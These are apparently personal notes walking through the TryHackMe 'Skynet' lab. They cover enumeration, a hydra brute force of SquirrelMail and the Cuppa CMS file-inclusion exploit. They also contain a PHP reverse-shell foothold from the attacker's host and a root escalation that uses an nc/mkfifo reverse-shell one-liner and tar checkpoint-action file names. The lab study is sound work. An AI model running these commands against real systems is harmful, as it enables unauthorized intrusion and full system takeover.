<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>skynet</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>skynet</h1><br/><p><strong><h1>THM SKYNET</h1></strong></p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p>nmap -sV -sC -O -vv 10.10.68.116</p><p></p><p>We find a webserver on 80</p><p>smb on 445</p><p></p><p>And some mail ports at 110 &amp; 143 (Not used for exploitation)</p><p></p><p>we open the webpage to have a blank skynet search page.</p><p>(Nothing intresting here)</p><p></p><p>Next we use gobuster to find out hidden directories.</p><p></p><p><img src="images/10-1.png" alt="images/10-1.png" /></p><p></p><p>Most of the directores in the output are not accessible.</p><p>Code 301: Means Permanently moved</p><p></p><p>Still <strong>http://10.10.68.116/squirrelmail</strong> will take us to a mail login page.</p><p></p><p>We do not have any credentials yet.</p><p></p><p></p><p>I start enuerating samba shares &amp; users.</p><p><em><strong>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.116</strong></em></p><p></p><p><img src="images/10-2.png" alt="images/10-2.png" /></p><p></p><p><img src="images/10-3.png" alt="images/10-3.png" /></p><p></p><p>We find one user: <em><strong>milesdyson</strong></em></p><p>We also find 2 user shares: <strong>\\10.10.68.116\anonymous</strong> &amp; <strong>\\10.10.68.116\milesdyson</strong></p><p></p><p></p><p>Guest Access is not allowed in <strong>\\10.10.68.116\milesdyson</strong></p><p>However, Guest Access is allowed in <strong>\\10.10.68.116\anonymous</strong></p><p></p><p>We check the share for further info</p><p></p><p><em><strong>smbclient //10.10.68.116/anonymous -U guest</strong></em></p><p></p><p><img src="images/10-4.png" alt="images/10-4.png" /></p><p></p><p>We download the two files with data. <strong>Attention.txt</strong> and <strong>log1.txt</strong></p><p></p><p><strong>Attention.txt</strong> : A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.</p><p>-Miles Dyson</p><p></p><p><strong>log1.txt:</strong> Looks like a file containing passwords. (May be some of them are still in use)</p><p></p><p></p><p>Now, i try to use the passwords in the log1.txt to bruteforce the samba share of milesdyson using <strong>hydra</strong>.</p><p></p><p><img src="images/10-5.png" alt="images/10-5.png" /></p><p></p><p>But as we see there is no success.</p><p></p><p>Next, I try to use the same set of passwords for the squirrel mail login using <strong>hydra</strong></p><p></p><p>I capture the request of a test login using burpsuite and record the error.</p><p></p><p><strong>Burp Request:</strong></p><p>POST /squirrelmail/src/redirect.php HTTP/1.1</p><p>Host: 10.10.68.116</p><p>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</p><p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</p><p>Accept-Language: en-US,en;q=0.5</p><p>Accept-Encoding: gzip, deflate</p><p>Content-Type: application/x-www-form-urlencoded</p><p>Content-Length: 84</p><p>Origin: <a href="http://10.10.68.116">http://10.10.68.116</a></p><p>Connection: close</p><p>Referer: <a href="http://10.10.68.116/squirrelmail/src/login.php">http://10.10.68.116/squirrelmail/src/login.php</a></p><p>Cookie: SQMSESSID=ak2eqf48ns0o4a8el0eu1a72v3</p><p>Upgrade-Insecure-Requests: 1</p><p></p><p>login_username=milesdyson&amp;secretkey=Bazinga&amp;js_autodetect_results=1&amp;just_logged_in=1</p><p></p><p><strong>Error Message:</strong></p><p>Unknown user or password incorrect.</p><p></p><p>Now using the above data and the error message received. I crafted the hydra command as follows.</p><p></p><p><img src="images/10-6.png" alt="images/10-6.png" /></p><p></p><p>Thus we find the mail password: <em><strong>cyborg007haloterminator</strong></em></p><p></p><p>Then we use the following credentials to get into the mailbox.</p><p>Username	:	<em><strong>milesdyson</strong></em></p><p>Password		:	<em><strong>cyborg007haloterminator</strong></em></p><p></p><p>Inside the inbox we find SMB password to <em><strong>miledyson</strong></em>.</p><p></p><p>Next we enumerate the SMB share of miledyson.</p><p></p><p><em><strong>smbclient //10.10.68.116/milesdyson -U milesdyson</strong></em></p><p></p><p>We find an important.txt</p><p></p><p><img src="images/10-7.png" alt="images/10-7.png" /></p><p></p><p></p><p>As we now know the CMS portal url. We go back to gobuster with this hidden directory to find some thing.</p><p></p><p><img src="images/10-8.png" alt="images/10-8.png" /></p><p></p><p>Here we find a directory called Administrator. We visit the link. <em><strong>http://10.10.68.116/45kra24zxs28v3yd/administrator</strong></em></p><p></p><p>We get a “<strong>cuppa CMS Login Page</strong>”</p><p></p><p><em><strong>searchsploit cuppa cms</strong></em></p><p></p><p><img src="images/10-9.png" alt="images/10-9.png" /></p><p></p><p><img src="images/10-10.png" alt="images/10-10.png" /></p><p></p><p>Next we study the 25971.txt file. See the following part</p><p>#####################################################</p><p>EXPLOIT</p><p>#####################################################</p><p></p><p>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt</p><p>http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</p><p></p><p>We can test this in our case by the following:</p><p><em><strong>http://10.10.68.116/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd</strong></em></p><p></p><p>We will get the /etc/passwd file of the target on the webpage indicating LFI.</p><p>However, we will use <strong>RFI</strong> here.</p><p></p><p></p><p></p><p><strong><h2>FootHold</h2></strong></p><p></p><p>We host the <em><strong>php-reverse-shell.php</strong></em> file in a python web server. Then use the following URL as payload.</p><p></p><p>1. Start a netcat listener as per the php reverse shell data.</p><p>2. Use the URL <em><strong>http://10.10.68.116/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.72.31/php-reverse-shell.php</strong></em></p><p>3. This will trigger the reverse shell and we will get the user flag.</p><p></p><p><strong><h2>Privelege Escalation</h2></strong></p><p></p><p>We view the crontab file to get the following details.</p><p><em><strong>cat /etc/crontab</strong></em></p><p></p><p>We browse “milesdyson” home directory and find a backup folder.</p><p></p><p>Inside backup folder, we find the backup.sh script which is run by root every 1 min.</p><p>This script makes a tar backup of /var/www/html</p><p></p><p>Inside we find <strong>tar</strong> command. Then look at GTFObins of how to escalate it.</p><p></p><p>We create the following files inside /var/ww/html</p><p>Exact commands should be used for creating the files else we may face error.</p><p></p><p><em><strong>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.72.31 8888 &gt;/tmp/f&quot; &gt; shell</strong></em></p><p><em><strong>touch /var/www/html/--checkpoint=1</strong></em></p><p><em><strong>touch /var/www/html/&quot;--checkpoint-action=exec=bash shell&quot;</strong></em> Or <em><strong>touch /var/www/html/--checkpoint-action=exec=bash\ shell</strong></em></p><p></p><p>Remember to to have a netcat listner ready. Within 1 minute we will get a reverse shell as root.</p><p>Get the root flag at /root/root.txt</p><p></p><p>Thanks !!</p></div>
</body>
</html>
